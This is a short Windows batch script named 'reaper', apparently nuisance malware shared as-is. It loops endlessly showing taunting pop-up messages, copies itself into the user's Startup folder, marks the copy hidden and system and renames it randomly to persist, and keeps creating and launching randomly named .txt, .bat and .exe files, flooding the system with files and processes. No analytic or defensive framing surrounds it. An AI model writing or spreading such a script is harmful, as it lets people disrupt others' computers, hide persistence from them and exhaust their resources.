@echo off
title reaper
:1
msg * dieXD
copy batchfilename "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /y
attrib +h +s "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batchfilename"
ren "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batchfilename" %random%text%random%
echo %random%reaper%random% >> %random%reaper%random%.txt
start batchfilename.bat
echo %random%reaper%random% >> %random%reaper%random%.bat
msg * hackedXD
echo %random%reaper%random% >> %random%reaper%random%.exe
start %random%reaper%random%.txt
start %random%reaper%random%.bat
start %random%reaper%random%.exe
msg * reaperhaskilledyouXD
goto :1